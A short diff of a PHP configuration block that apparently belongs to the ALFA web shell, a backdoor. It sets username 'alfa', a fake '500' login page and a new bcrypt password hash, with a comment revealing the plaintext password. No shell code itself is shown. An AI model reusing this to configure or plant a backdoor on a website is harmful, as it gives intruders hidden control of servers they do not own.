@@ -1,7 +1,7 @@
 <?php
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
-    'password' => 'a26ac6ca89753c7dbff89e4ec79dff54',//bcrypt(bong.vin)
+    'password' => '$2a$12$MKWe4e1rOlikDWOmcDNRsOl/jP2m12uDo6VIteLzHr/qdziIaA.sG',//bcrypt(bong.vin)
     'safe_mode' => '1',
     'login_page' => '500',
     'show_icons' => '1',
